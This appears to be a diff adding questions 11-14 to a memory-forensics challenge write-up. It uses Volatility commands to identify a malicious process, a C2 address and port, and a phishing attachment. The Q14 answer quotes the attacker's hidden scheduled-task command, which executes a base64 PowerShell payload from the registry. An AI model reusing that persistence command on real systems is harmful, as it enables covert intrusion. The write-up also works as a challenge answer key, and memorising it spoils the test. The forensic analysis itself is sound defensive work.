@@ -120,3 +120,30 @@ vol -f WKSTN-2961.raw windows.netscan
 ```
 After that we will look at the result.
 ![image5](images/pic11.png)
+Q11:What is the full file path of the malicious process used to establish the C2 connection
+```bash
+C:\Windows\Tasks\updater.exe
+```
+First we run this command 
+vol -f WKSTN-2961.raw windows.dlllist --pid 6216
+In this command dlllist shows the details of the dynamic link libraries that is involved in that process and we use pid 6216 which is pid of malicious process.
+![image5](images/pic12.png)
+Q12:What is the IP address and port of the C2 connection initiated by the malicious binary? (Format: IP address:port)
+```bash
+128.199.95.189:8080
+```
+For this we use the same windows.netscan command and look at the end of the result
+![image5](images/pic13.png)
+Q13:What is the full file path of the malicious email attachment based on the memory dump?
+```bash
+C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc
+```
+For this first i ran the following command.
+vol -f WKSTN-2961.raw windows.cmdline > cmdline.txt
+Saved the result in a file and then i greped for doc and got the result
+![image5](images/pic14.png)
+Q14:The attacker implanted a scheduled task right after establishing the c2 callback. What is the full command used by the attacker to maintain persistent access?
+```bash
+schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"'
+```
+![image5](images/pic15.png)
